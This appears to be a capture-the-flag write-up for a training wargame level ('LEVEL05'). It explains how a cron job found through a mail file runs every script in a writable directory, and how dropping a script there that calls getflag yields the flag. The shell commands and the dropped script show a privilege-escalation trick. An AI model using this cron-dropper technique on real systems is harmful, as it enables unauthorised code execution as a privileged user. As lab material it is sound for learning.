@@ -1,0 +1,21 @@
+LEVEL05
+
+- A "You have a new mail" message displays on the terminal.
+- Among others, we look for "level05" to find more information:
+"find / -name "level05"
+
+- Many outpouts appear, last of which is /var/mail/level05, which looks promising.
+- We go to the path and "cat level05".
+- It is a cron job, executing a script at /usr/sbin/openarenaserver every 2 minutes.
+- We go to the path and "cat openarenaserver".
+
+- We find out that it iterates over all files in the directory, stores them, aand executes the file at the given path in debug mode.
+- We make a script in /opt/openarenaserver that runs getflag and puts the output into /tmp/flag05.
+"cd /opt/openarenaserver"
+"nano flag.sh"
+"#!/bin/bash/
+/bin/getflag > /tmp/flag05"
+
+- Then we run cat until the flag appears once the script gets executed:
+"cat /tmp/flag05"
+
